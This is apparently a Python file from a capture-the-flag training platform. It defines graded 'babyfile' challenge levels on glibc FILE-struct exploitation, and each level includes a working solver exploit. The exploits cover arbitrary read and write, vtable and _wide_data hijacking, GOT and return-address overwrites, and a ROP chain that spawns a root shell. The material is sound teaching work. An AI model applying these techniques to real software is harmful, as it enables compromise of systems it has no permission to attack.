import pwnshop
import signal
import struct
import pwn

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge


class BabyFileBase(Challenge):
    pwn.context.arch = "amd64"
    
    file_path = "/tmp/babyfile.txt"
    write_offset = 0
    TEMPLATE_PATH = "babyfile/babyfile.c"
    IMAGE = "ubuntu:20.04"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)



class BabyFileArbitraryRead(BabyFileBase):
    """
    Harness the power of FILE structs to arbitrarily read data.
    """
    PIE = False

    schema = "tutorial"
    hidden_flag = True
    fwrite = True
    write_fp = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            flagaddr = process.elf.symbols["secret"]
            fp = pwn.FileStructure()
            fp.write(flagaddr, 100)
            process.sendline(bytes(fp)[:0x78])
            assert self.flag in process.readall()
        

class BabyFileArbitraryWrite(BabyFileBase):
    """
    Harness the power of FILE structs to arbitrarily write data to bypass a security check.
    """
    PIE = False

    schema = "tutorial"
    authenticate = True
    fread = True
    win_function = True
    write_fp = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            authaddr = process.elf.symbols["authenticated"]
            fp = pwn.FileStructure()
            fp.read(authaddr, 0x101)
            process.sendline(bytes(fp)[:0x78])
            process.sendline(b"A"*0x100)
            assert self.flag in process.readall()
        

class BabyFileChangeFd(BabyFileBase):
    """
    Harness the power of FILE structs to redirect data output.
    """
    PIE = True

    file_path = "/tmp/babyflag.txt"
    read_flag = True
    schema = "tutorial"
    write_fp = True
    write_offset = 0x70
    rw = True
    babyflag = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            process.sendline(pwn.p32(4))
            with open("/tmp/babyfile.txt", "r") as flagfile:
                output = flagfile.read()
                assert self.flag.decode("latin-1") in output

        
class BabyFileArbitraryExecute(BabyFileBase):
    """
    Harness the power of FILE structs to arbitrarily read/write data to hijack control flow.
    """
    PIE = False

    schema = "tutorial"
    fread = True
    write_fp = True
    leak_stack = True
    win_function = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            process.readuntil(b"[LEAK] return address is stored at: ")
            retaddr = int(process.readline(), 16)
            win_addr = elf.symbols["win"]
            fp = pwn.FileStructure()
            fp.read(retaddr, 0x101)
            process.sendline(bytes(fp)[:0x78])
            process.send(pwn.p64(win_addr)*0x25)
            assert self.flag in process.readall()


class BabyFileStdoutArbitraryRead(BabyFileBase):
    """
    Abuse built-in FILE structs to leak sensitive information.
    """
    PIE = False

    schema = "tutorial"
    hidden_flag = True
    write_stdout = True
    write_fp = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            flagaddr = process.elf.symbols["secret"]
            fp = pwn.FileStructure()
            fp.write(flagaddr, 100)
            process.sendline(bytes(fp)[:0x78])
            assert self.flag in process.readall()


class BabyFileStdinArbitraryWrite(BabyFileBase):
    """
    Abuse built-in FILE structs to bypass a security check.
    """
    PIE = False

    schema = "tutorial"
    win_function = True
    write_stdin = True
    write_fp = True
    authenticate = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            authaddr = elf.symbols["authenticated"]
            fp = pwn.FileStructure()
            fp.read(authaddr, 0x9)
            process.sendafter(b'Now reading from stdin directly to the FILE struct.', bytes(fp)[:0x78])
            process.sendlineafter(b"Please log in.", b"A"*0x8)
            assert self.flag in process.readall()


class BabyFileVtableOverwriteWinNoOverlap(BabyFileBase):
    """
    Create a fake _wide_data struct to hijack control of the virtual function table of a FILE struct.
    """
    PIE = False
    win_function = True

    schema = "tutorial"
    leak_libc = True
    leak_buf = True
    write_fp = True
    write_buf = True
    fwrite = True
    

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)

            process.readuntil(b"[LEAK] The address of puts() within libc is: ")
            puts_addr = int(process.readline(), 16)
            libc_base = puts_addr - libc_elf.symbols["puts"]

            process.readuntil(b"[LEAK] The heap is located at: ")
            heap_addr = int(process.readline(), 16)
            buf_addr = heap_addr + 0x2a0
            fp_addr = buf_addr + 0x110

            win_addr = elf.symbols["win"]
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = buf_addr
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            
            fake_vtable_ptr = wide_data_ptr + 0xe8 - 0x68
            fake_wide_data = b'\x00'*0xe0 + pwn.p64(fake_vtable_ptr) + pwn.p64(win_addr)
            process.sendline(fake_wide_data)

            fp = pwn.FileStructure()
            fp.flags = pwn.p32(0x01010101)
            fp._wide_data = wide_data_ptr
            fp._lock = stderr_lock

            process.sendline(bytes(fp)[:0xd8] + pwn.p64(fake_vtable))
            assert self.flag in process.readall()


class BabyFileStdoutVtableOverwriteWin(BabyFileBase):
    """
    Create a fake _wide_data struct to hijack control of the virtual function table of a built-in FILE struct.
    """
    PIE = False
    auth_function = True

    schema = "tutorial"
    leak_libc = True
    write_stdout = True
    write_fp = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] The address of puts() within libc is: ")
            puts_addr = int(process.readline(), 16)
            libc_base = puts_addr - libc_elf.symbols["puts"]
            auth_addr = elf.symbols["authenticate"]
            stdout = libc_base + libc_elf.symbols['_IO_2_1_stdout_']
            stdout_lock = libc_base + 0x21ba80
            #stdout_lock = libc_base + 0x7ffff7f91a70 - 0x7ffff7d76000

            wide_data_ptr = stdout+0x10
            fake_vtable_ptr = stdout+0x78
            fake_vtable = libc_base + libc_elf.sym['_IO_wfile_jumps'] - 0x1a0 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow

            fp = pwn.FileStructure() 
            fp.flags = pwn.p32(0x01010101)
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stdout_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable) + \
                    pwn.p64(auth_addr) + \
                    pwn.p64(0) + \
                    pwn.p64(fake_vtable_ptr)
            process.sendline(fp)
            flag_mode = pwn.os.stat("/flag").st_mode & 0o777
            pwn.os.chmod("/flag", 0o600)
            assert (flag_mode == 0o777)


class BabyFileVtableOverwriteWin(BabyFileBase):
    """
    Create a fake _wide_data struct to hijack control of the virtual function table of a FILE struct.
    """
    PIE = False
    CANARY = True
    win_function = True

    schema = "tutorial"
    leak_libc = True
    leak_fp = True
    write_fp = True
    fwrite = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] The address of puts() within libc is: ")
            puts_addr = int(process.readline(), 16)
            process.readuntil(b"[LEAK] You are writing to: ")
            fp_addr = int(process.readline(), 16)
            libc_base = puts_addr - libc_elf.symbols["puts"]
            win_addr = elf.symbols["win"]
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = fp_addr + 0x10
            fake_vtable_ptr = fp_addr + 0x78
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            
            fp = pwn.FileStructure() 
            fp.flags = pwn.p32(0x01010101)
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stderr_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable) + \
                    pwn.p64(win_addr) + \
                    pwn.p64(0) + \
                    pwn.p64(fake_vtable_ptr)
            process.sendline(fp)
            assert self.flag in process.readall()


class BabyFileVtableOverwriteWinParameter(BabyFileBase):
    """
    Create a fake _wide_data struct to hijack control of the virtual function table of a FILE struct.
    """
    PIE = False
    CANARY = True

    auth_function = True
    password = True
    schema = "tutorial"
    leak_libc = True
    leak_fp = True
    write_fp = True
    fwrite = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] The address of puts() within libc is: ")
            puts_addr = int(process.readline(), 16)
            process.readuntil(b"[LEAK] You are writing to: ")
            fp_addr = int(process.readline(), 16)
            libc_base = puts_addr - libc_elf.symbols["puts"]
            win_addr = elf.symbols["authenticate"]
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = fp_addr + 0x10
            fake_vtable_ptr = fp_addr + 0x78
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            
            fp = pwn.FileStructure() 
            fp.flags = pwn.u64("password")
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stderr_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable) + \
                    pwn.p64(win_addr) + \
                    pwn.p64(0) + \
                    pwn.p64(fake_vtable_ptr)
            process.sendline(fp)
            assert self.flag in process.readall()


class BabyFileCustomArbitraryRead(BabyFileBase):
    """
    Apply FILE struct exploits to leak a secret value.
    """
    PIE = False

    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "write_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 1
    hidden_flag = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            flagaddr = process.elf.symbols["secret"]
            for cmd in [b"open_file", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.write(flagaddr, 100)
            process.send(bytes(fp)[:0x78])
            process.sendline(b"write_file")
            process.sendline(b"quit")
            assert self.flag in process.readall()

        
class BabyFileCustomArbitraryWrite(BabyFileBase):
    """
    Apply FILE struct exploits to write data to bypass a security check.
    """
    PIE = True
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "read_file", "write_fp", "authenticate", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 10
    leak_pie = True
    authenticate = True
    win_function = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] main is located at: ")
            mainaddr = int(process.readline(), 16)
            procbase =  mainaddr - process.elf.symbols["main"]
            authaddr = procbase + process.elf.symbols["authenticated"]
            for cmd in [b"new_note 2 1", b"open_file", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.read(authaddr, 2)
            process.send(bytes(fp)[:0x78])
            process.sendline(b"read_file 2")
            process.send(b"AA")
            process.sendline(b"authenticate")
            process.sendline(b"quit")
            assert self.flag in process.readall()

        
class BabyFileOverwriteSavedRIP(BabyFileBase):
    """
    Apply FILE struct exploits to write data and hijack control flow.
    """
    PIE = True
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "write_file", "read_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 10
    leak_stack = True
    win_function = True

    #find canary offset
    def verify(self, **kwargs):
        for canary_distance in range(128, 0x200):
            with self.run_challenge(**kwargs) as process:
                elf = pwn.ELF(process.executable)
                libc_elf = pwn.ELF(process.libc.path)
                process.readuntil(b"[LEAK] The address of cmd where you are writing to is: ")
                cmdaddr = int(process.readline(), 16)
                for cmd in [b"new_note 2 8", b"open_file", b"write_fp"]:
                    process.sendline(cmd)
                fp = pwn.FileStructure()
                fp.read(cmdaddr, canary_distance)
                process.send(bytes(fp)[:0x78])
                process.sendline(b"read_file 2")
                process.send(pwn.cyclic(canary_distance))
                process.sendline(b"quit")
                if (b"*** stack smashing detected ***" in process.clean()):
                    break
        else:
            assert False
        canary_distance -= 1
        
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            #setup
            process.readuntil(b"[LEAK] The address of cmd where you are writing to is: ")
            cmdaddr = int(process.readline(), 16)
            for cmd in [b"open_file", b"write_fp"]:
                process.sendline(cmd)
            #arbitrary read
            fp = pwn.FileStructure()
            retaddr = cmdaddr + canary_distance + 0x10
            fp.write(retaddr, 0x8)
            process.send(bytes(fp)[:0x78])
            #extract return address to main
            process.sendline(b"new_note 0 1")
            process.clean()
            process.sendline(b"write_file 0")
            ret = process.readuntil(b"[*]")[-12:-4]
            epilogue = bytes(reversed(ret[0:2]))
            ret = pwn.u64(ret)

            #find bin_base and win_addr
            main_start = elf.symbols["main"]
            main_base = int(main_start / (16 ** 3)) * (16 ** 3)
            ret_addr = main_base + (ret % (16 ** 3))
            bin_base = ret - ret_addr
            win_addr = bin_base + elf.symbols["win"]

            #arbitrary write
            process.sendline(b"write_fp")
            fp = pwn.FileStructure()
            retaddr = cmdaddr + canary_distance + 0x10
            fp.read(retaddr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.sendline(b"new_note 3 1")
            process.sendline(b"read_file 3")
            payload = pwn.p64(win_addr)
            process.send(payload)
            
            process.sendline(b"quit")
            assert self.flag in process.readall()

        
class BabyFilePartialOverwriteSavedRIP(BabyFileBase):
    """
    Apply FILE struct exploits to write data to hijack control flow.. again?
    """
    PIE = True
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "read_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 10
    leak_stack = True
    win_function = True

    @pwnshop.retry(256, timeout=5)
    def control_ret(self, canary_distance, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] The address of cmd where you are writing to is: ")
            cmdaddr = int(process.readline(), 16)
            for cmd in [b"new_note 2 1", b"open_file", b"write_fp"]:
                process.sendline(cmd)

            fp = pwn.FileStructure()
            retaddr = cmdaddr + canary_distance + 0x10
            fp.read(retaddr, 0x2)
            process.send(bytes(fp)[:0x78])
            process.sendline(b"read_file 2")
            epilogue = pwn.p64(process.elf.symbols["win"])[:2]
            process.send(epilogue)
            process.sendline(b"quit")
            if self.flag in process.readall():
                return True

    def verify(self, **kwargs):
        #find the canary
        for canary_distance in range(128, 0x200):
            with self.run_challenge(**kwargs) as process:
                elf = pwn.ELF(process.executable)
                libc_elf = pwn.ELF(process.libc.path)
                process.readuntil(b"[LEAK] The address of cmd where you are writing to is: ")
                cmdaddr = int(process.readline(), 16)
                for cmd in [b"new_note 2 8", b"open_file", b"write_fp"]:
                    process.sendline(cmd)
                fp = pwn.FileStructure()
                fp.read(cmdaddr, canary_distance)
                process.send(bytes(fp)[:0x78])
                process.sendline(b"read_file 2")
                process.send(pwn.cyclic(canary_distance))
                process.sendline(b"quit")
                if (b"*** stack smashing detected ***" in process.clean()):
                    break
        else:
            assert False
        canary_distance -= 1

        return self.control_ret(canary_distance, **kwargs)


class BabyFileOverwriteGOT(BabyFileBase):
    """   
    Apply FILE struct exploits to overwrite a GOT entry.
    """
    PIE = False
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "read_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 10
    win_function = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            got_addr = elf.symbols["got.fclose"]
            win_addr = elf.symbols["win"]
            for cmd in [b"open_file", b"new_note 0 1", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.read(got_addr, 8)
            process.send(bytes(fp)[:0x78])
            process.sendline(b"read_file 0")
            process.sendline(pwn.p64(win_addr))
            process.sendline("close_file")
            process.sendline(b"quit")

            assert self.flag in process.readall()


class BabyFileCustomOverwriteStdout(BabyFileBase):
    """o
    Apply FILE struct exploits to overwrite a built-in FILE struct print the flag.
    """
    PIE = False
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "read_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    notes_count = 10
    leak_libc = True
    hidden_flag = True

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            process.readuntil(b"[LEAK] The address of puts() within libc is: ")
            putsaddr = int(process.readline(), 16)
            libcbase = putsaddr - libc_elf.symbols["puts"]
            libcstdout = libcbase + libc_elf.symbols["_IO_2_1_stdout_"]
            for cmd in [b"new_note 2 1",b"open_file", b"write_fp"]:
                process.sendline(cmd)

            fp = pwn.FileStructure()
            fp.read(libcstdout, 0x89)
            process.send(bytes(fp)[:0x88])

            process.sendline(b"read_file 2")
            flagaddr = elf.symbols["secret"]
            fp = pwn.FileStructure()
            fp.write(flagaddr, 100)
            process.send(bytes(fp)[:0x88])
            process.sendline(b"quit")
            assert self.flag in process.readall()


class BabyFileCustomChangeFd(BabyFileBase):
    """
    Apply FILE struct exploits to read/write data and capture the flag.
    """
    PIE = True
    functions = ["new_note", "del_note", "write_note", "read_note", "open_file", "close_file", "read_file", "write_file", "write_fp", "open_flag", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    rw = True
    babyflag = True
    notes_count = 10

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            
            for cmd in [b"new_note 2 100", b"open_file", b"open_flag", b"write_fp"]:
                process.sendline(cmd)

            process.send(b"\x00"*0x70 + pwn.p32(4))
            process.sendline(b"read_file 2")

            process.sendline(b"write_fp")
            process.send(b"\x00"*0x70 + pwn.p32(3))
            process.sendline(b"write_file 2")

            process.sendline(b"quit")
            with open("/tmp/babyfile.txt", "r") as flagfile:
                output = flagfile.read()
                assert self.flag.decode("latin-1") in output


class BabyFileCustomVtableNoOverlap(BabyFileBase):
    """
    Apply FILE struct exploits to arbitrarily read/write data or hijack control flow.
    """
    PIE = False
    win_function = True
    functions = ["new_note", "del_note", "write_note", "read_note", "read_note", "open_file", "close_file", "write_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    rw = True
    notes_count = 10

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            fp_addr = elf.symbols["fp"]
            win_addr = elf.symbols["win"]

            #setup and leak fp heap address
            for cmd in [b"new_note 0 1", b"open_file", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.write(fp_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            fp_heap = process.readuntil(b"[*]")[-12:-4]
            fp_heap = int.from_bytes(fp_heap, "little")

            #leak libc address from known fp heap address
            process.sendline(b"write_fp")
            fp = pwn.FileStructure()
            fp_libc_addr = fp_heap + 8*27
            fp.write(fp_libc_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            libc_addr = process.readuntil(b"[*]")[-12:-4]
            libc_addr = int.from_bytes(libc_addr, "little")
            libc_base = libc_addr - 0x216600

            #setup to attack stdout vtable
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = fp_heap + 0x1e0
            fake_vtable_ptr = wide_data_ptr + 0xe8 - 0x68
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            fake_wide_data = b'\x00'*0xe0 + pwn.p64(fake_vtable_ptr) + pwn.p64(win_addr)

            #hijack control flow
            for cmd in [b"new_note 1 256", b"write_note 1", fake_wide_data, b"write_fp"]:
                process.sendline(cmd)
            
            fp = pwn.FileStructure() 
            fp.flags = pwn.p32(0x01010101)
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stderr_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable)
            process.sendline(fp)
            process.sendline(b"write_file 0")
            process.sendline(b"exit")
            assert self.flag in process.readall()


class BabyFileCustomLeakToVtable(BabyFileBase):
    """
    Apply FILE struct exploits to arbitrarily read/write data or hijack control flow.
    """
    PIE = False
    win_function = True
    functions = ["new_note", "del_note", "open_file", "close_file", "write_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    rw = True
    notes_count = 10

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            fp_addr = elf.symbols["fp"]
            win_addr = elf.symbols["win"]

            #setup and leak fp heap address
            for cmd in [b"new_note 0 1", b"open_file", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.write(fp_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            fp_heap = process.readuntil(b"[*]")[-12:-4]
            fp_heap = int.from_bytes(fp_heap, "little")

            #leak libc address from known fp heap address
            process.sendline(b"write_fp")
            fp = pwn.FileStructure()
            fp_libc_addr = fp_heap + 8*27
            fp.write(fp_libc_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            libc_addr = process.readuntil(b"[*]")[-12:-4]
            libc_addr = int.from_bytes(libc_addr, "little")
            libc_base = libc_addr - 0x216600
            
            #setup to write fp
            process.sendline(b"write_fp")

            #setup to attack stdout vtable
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = fp_heap + 0x10
            fake_vtable_ptr = fp_heap + 0x78
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            
            #hijack control flow
            fp = pwn.FileStructure() 
            fp.flags = pwn.p32(0x01010101)
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stderr_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable) + \
                    pwn.p64(win_addr) + \
                    pwn.p64(0) + \
                    pwn.p64(fake_vtable_ptr)
            process.sendline(fp)
            process.sendline(b"write_file 0")
            process.sendline(b"exit")
            assert self.flag in process.readall()


class BabyFileCustomLeakToVtableParameter(BabyFileBase):
    """
    Apply various FILE struct exploits to obtain a leak, then hijack hijack control flow.
    """
    PIE = False
    auth_function = True
    win_function = True
    functions = ["new_note", "del_note", "open_file", "close_file", "write_file", "write_fp", "quit"]
    functions_description = "/".join(functions)
    schema = "notesapp"
    password = True
    rw = True
    notes_count = 10

    @pwnshop.retry(16, timeout=4)
    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            elf = pwn.ELF(process.executable)
            libc_elf = pwn.ELF(process.libc.path)
            fp_addr = elf.symbols["fp"]
            win_addr = elf.symbols["win"]

            #setup and leak fp heap address
            for cmd in [b"new_note 0 1", b"open_file", b"write_fp"]:
                process.sendline(cmd)
            fp = pwn.FileStructure()
            fp.write(fp_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            fp_heap = process.readuntil(b"[*]")[-12:-4]
            fp_heap = int.from_bytes(fp_heap, "little")

            #leak libc address from known fp heap address
            process.sendline(b"write_fp")
            fp = pwn.FileStructure()
            fp_libc_addr = fp_heap + 8*27
            fp.write(fp_libc_addr, 0x8)
            process.send(bytes(fp)[:0x78])
            process.clean()
            process.sendline(b"write_file 0")
            libc_addr = process.readuntil(b"[*]")[-12:-4]
            libc_addr = int.from_bytes(libc_addr, "little")
            libc_base = libc_addr - 0x216600
            
            #setup to write fp
            process.sendline(b"write_fp")

            #setup to attack stdout vtable
            stderr_lock = libc_base + 0x21ba60
            wide_data_ptr = fp_heap + 0x10
            fake_vtable_ptr = fp_heap + 0x78
            fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38 # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
            
            #hijack control flow
            fp = pwn.FileStructure() 
            fp.flags = pwn.u64("password")
            fp._wide_data = pwn.p64(wide_data_ptr)
            fp._lock = pwn.p64(stderr_lock)

            fp = bytes(fp)[:0xd8] + \
                    pwn.p64(fake_vtable) + \
                    pwn.p64(win_addr) + \
                    pwn.p64(0) + \
                    pwn.p64(fake_vtable_ptr)
            process.sendline(fp)
            process.sendline(b"write_file 0")
            process.sendline(b"exit")
            assert self.flag in process.readall()

class BabyFilePivot(BabyFileBase):
    """
    Apply FILE struct exploits to obtain the flag.
    
    """
    PIE = True
    win_function = False
    schema = "tutorial"
    leak_libc = True
    write_fp = True
    write_stderr = True
    
    # TODO: exploit is good, but pwnshop verification fails
    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as p:
            elf = pwn.ELF(p.executable)
            libc = pwn.ELF(elf.libc.path)
            p.recvuntil(b"is: ")
            puts_addr = int(p.recvline()[:-1], 16)
            libc.address = puts_addr - libc.symbols['puts']

            rop = pwn.ROP(libc)

            # Note: This cannot use pwn.ROP calls because the addresses
            # have various constraints on them.

            # EX: this first gadget must
            # LSB & 8 = 0
            # 2nd LSB & 8 = 0
            rop.raw(libc.address + 0x0000000000157061) # ret
            rop.raw(libc.address + 0x0000000000157061) # ret
            rop.raw(libc.address + 0x00000000001546b5) # pop rdi ; ret
            rop.raw(pwn.p64(0))
            rop.raw(pwn.p64(libc.symbols['setuid']))
            rop.raw(libc.address + 0x00000000001546b5) # pop rdi ; ret
            rop.raw(pwn.p64(next(libc.search(b"/bin/sh"))))
            rop.raw(pwn.p64(libc.address + 0x2601f)) # pop rsi ; ret
            rop.raw(pwn.p64(0))
            rop.raw(libc.address + 0x0000000000157061) # ret
            rop.raw(pwn.p64(libc.symbols['system']))

            ropchain = rop.chain()

            fp = pwn.FileStructure()
            fp._lock = libc.symbols['_IO_2_1_stderr_'] + 0x88 # stdout lock

            # Get from cleanup routine to vtable -> wide_data -> vtable call
            fp._wide_data = libc.symbols['_IO_2_1_stderr_'] + len(ropchain) - 8
            fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0xc0

            payload = ropchain
            payload += bytes(fp)[len(payload):]
            payload += b'\x00' * 64 +  pwn.p64(libc.symbols['_IO_2_1_stderr_'] + len(ropchain) - 0x68 - 8)
            payload += b'a' * 0x8
            payload += pwn.p64(libc.symbols['_IO_2_1_stderr_'] + len(ropchain) + 0xe0 - 0x68)

            # Rop gadget called from vtable exploit, which pivots to beginning of the payload
            payload +=  pwn.p64(libc.address + 0x578c8) # leave ret

            p.send(payload)
            p.recvuntil("Goodbye!")
            p.sendline("cat /flag; exit")
            assert self.flag in p.readall()

LEVELS = [
    BabyFileArbitraryRead,
    BabyFileArbitraryWrite,
    BabyFileChangeFd,
    BabyFileArbitraryExecute,
    BabyFileStdoutArbitraryRead,
    BabyFileStdinArbitraryWrite,
    BabyFileVtableOverwriteWinNoOverlap,
    BabyFileVtableOverwriteWin,
    BabyFileStdoutVtableOverwriteWin,
    BabyFileVtableOverwriteWinParameter,
    BabyFileCustomArbitraryRead,
    BabyFileCustomArbitraryWrite,
    BabyFileOverwriteSavedRIP,
    BabyFilePartialOverwriteSavedRIP,
    BabyFileOverwriteGOT,
    BabyFileCustomOverwriteStdout,
    BabyFileCustomChangeFd,
    BabyFileCustomVtableNoOverlap,
    BabyFileCustomLeakToVtable,
    BabyFileCustomLeakToVtableParameter,
    BabyFilePivot
]



CHOOSE_LEVELS = [
    # Intro
    BabyFileArbitraryRead,
    BabyFileArbitraryWrite,
    BabyFileChangeFd,
    BabyFileArbitraryExecute,
    BabyFileStdoutArbitraryRead,
    BabyFileStdinArbitraryWrite,
    BabyFileVtableOverwriteWinNoOverlap,
    BabyFileVtableOverwriteWin,
    BabyFileStdoutVtableOverwriteWin,
    BabyFileVtableOverwriteWinParameter,

    # Advanced
    BabyFileCustomArbitraryRead,
    BabyFileCustomArbitraryWrite,
    BabyFileOverwriteSavedRIP,
    BabyFilePartialOverwriteSavedRIP,
    BabyFileOverwriteGOT,
    BabyFileCustomOverwriteStdout,
    BabyFileCustomChangeFd,
    BabyFileCustomVtableNoOverlap,
    BabyFileCustomLeakToVtable,
    BabyFileCustomLeakToVtableParameter,

    # Bonus
    BabyFilePivot
]
pwnshop.register_challenges(LEVELS)
